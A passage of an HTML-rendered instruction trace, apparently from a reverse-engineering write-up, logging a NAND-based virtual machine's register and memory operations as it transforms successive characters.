(-13)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -13</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (28)</span><br><span class="line">v14 = v1[320] (,)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (44)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(285)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[285] = v12 (28)</span><br><span class="line">v10 = v1[320] (44)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (45)</span><br><span class="line">v15 = &amp;v1[325] (19)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (-)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(45)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (45)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[286] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 45 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (-)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 45</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-14)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -14</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (29)</span><br><span class="line">v14 = v1[320] (-)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (45)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(286)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[286] = v12 (29)</span><br><span class="line">v10 = v1[320] (45)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (46)</span><br><span class="line">v15 = &amp;v1[325] (18)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (.)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(46)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (46)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[287] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 46 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (.)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 46</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-15)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -15</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (30)</span><br><span class="line">v14 = v1[320] (.)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (46)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(287)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[287] = v12 (30)</span><br><span class="line">v10 = v1[320] (46)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (47)</span><br><span class="line">v15 = &amp;v1[325] (17)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (/)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(47)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (47)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[288] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 47 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (/)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 47</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-16)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -16</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (31)</span><br><span class="line">v14 = v1[320] (/)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (47)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(288)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[288] = v12 (31)</span><br><span class="line">v10 = v1[320] (47)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (48)</span><br><span class="line">v15 = &amp;v1[325] (16)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (0)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(48)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (48)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[289] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 48 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-1)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -1</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (0)</span><br><span class="line">v14 = v1[320] (0)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (48)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(289)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ( )</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[289] = v12 (0)</span><br><span class="line">v10 = v1[320] (48)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (49)</span><br><span class="line">v15 = &amp;v1[325] (15)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (1)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (49)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[290] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (1)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 49</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-2)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -2</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (1)</span><br><span class="line">v14 = v1[320] (1)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (49)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(290)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[290] = v12 (1)</span><br><span class="line">v10 = v1[320] (49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (50)</span><br><span class="line">v15 = &amp;v1[325] (14)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (2)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(50)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (50)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[291] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 50 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (2)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 50</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-3)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -3</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (2)</span><br><span class="line">v14 = v1[320] (2)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (50)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(291)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[291] = v12 (2)</span><br><span class="line">v10 = v1[320] (50)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (51)</span><br><span class="line">v15 = &amp;v1[325] (13)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (3)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(51)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (51)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[292] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 51 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (3)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 51</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-4)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -4</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (3)</span><br><span class="line">v14 = v1[320] (3)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (51)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(292)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[292] = v12 (3)</span><br><span class="line">v10 = v1[320] (51)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (52)</span><br><span class="line">v15 = &amp;v1[325] (12)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (4)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(52)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (52)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[293] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 52 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (4)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 52</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-5)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -5</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (4)</span><br><span class="line">v14 = v1[320] (4)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (52)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(293)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[293] = v12 (4)</span><br><span class="line">v10 = v1[320] (52)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (53)</span><br><span class="line">v15 = &amp;v1[325] (11)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (5)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(53)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (53)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[294] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 53 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (5)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 53</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-6)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -6</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (5)</span><br><span class="line">v14 = v1[320] (5)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (53)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(294)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[294] = v12 (5)</span><br><span class="line">v10 = v1[320] (53)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (54)</span><br><span class="line">v15 = &amp;v1[325] (10)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (6)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(54)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (54)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[295] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 54 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (6)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 54</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-7)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -7</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (6)</span><br><span class="line">v14 = v1[320] (6)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (54)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(295)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[295] = v12 (6)</span><br><span class="line">v10 = v1[320] (54)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (55)</span><br><span class="line">v15 = &amp;v1[325] (9)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (7)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(55)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (55)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[296] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 55 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-49)</span><br><span class="line">v10 = c(-49)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (7)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 55</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-8)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -49 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-1)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -1 ; c = -8</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (7)</span><br><span class="line">v14 = v1[320] (7)</span><br><span class="line">c = v14</span><br><span class="line">v13 = 